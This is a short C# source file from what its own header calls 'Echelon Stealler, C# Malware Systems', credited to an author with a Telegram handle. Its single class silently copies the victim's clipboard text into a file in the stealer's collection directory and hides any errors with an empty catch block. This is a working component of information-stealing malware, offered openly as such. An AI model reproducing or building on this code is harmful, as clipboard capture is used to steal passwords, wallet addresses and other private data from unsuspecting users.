///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.IO;
using System.Windows;

namespace Echelon
{
    class BuffBoard
    {
        public static void Inizialize(string Echelon_Dir)
        {
            try
            {
                File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", $"[Clipboard data found] - [{"MM.dd.yyyy - HH:mm:ss"}]\r\n\r\n{Clipboard.GetText()}\r\n\r\n");
            }
            catch  { }
        }
    }
}
